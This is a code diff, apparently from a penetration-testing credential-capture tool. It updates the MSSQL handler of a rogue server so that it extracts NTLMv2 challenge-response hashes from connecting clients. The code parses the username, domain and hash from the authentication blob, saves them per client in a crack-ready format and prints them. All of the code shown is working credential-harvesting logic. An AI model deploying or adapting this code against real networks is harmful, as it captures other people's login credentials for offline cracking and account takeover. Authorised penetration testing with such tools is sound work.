@@ -551,11 +551,13 @@ def ParseSQLHash(data,client):
        print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
        outfile = "MSSQL-NTLMv1-Client-"+client+".txt"
        WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
-    if NthashLen > 24:
-       print "[+]MsSQL LMv2 Hash detected"
-       NthashLen = 64
-       print "LMV2 Hash is : ", LMHash[:32]+":"+LMHash[32:]
+    if NthashLen > 60:
+       print NthashLen
+       print "[+]MSSQL NTLMv2 Hash detected"
        DomainLen = struct.unpack('<H',data[36:38])[0]
+       NthashOffset = struct.unpack('<H',data[32:34])[0]
+       NthashLen = struct.unpack('<H',data[30:32])[0]
+       Hash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
        DomainOffset = struct.unpack('<H',data[40:42])[0]
        Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
        print "Domain is :", Domain
@@ -563,8 +565,10 @@ def ParseSQLHash(data,client):
        UserOffset = struct.unpack('<H',data[48:50])[0]
        User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
        print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-       outfile = "MSSQL-LMv2-Client-"+client+".txt"
-       WriteData(outfile,User+"::"+Domain+":"+NumChal+":"+LMHash[:32]+":"+LMHash[32:])
+       outfile = "MSSQL-NTLMv2-Client-"+client+".txt"
+       Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
+       WriteData(outfile,Writehash)
+       print "Complete Hash is :", Writehash
 
 #MS-SQL server class.
 class MSSQL(SocketServer.BaseRequestHandler):
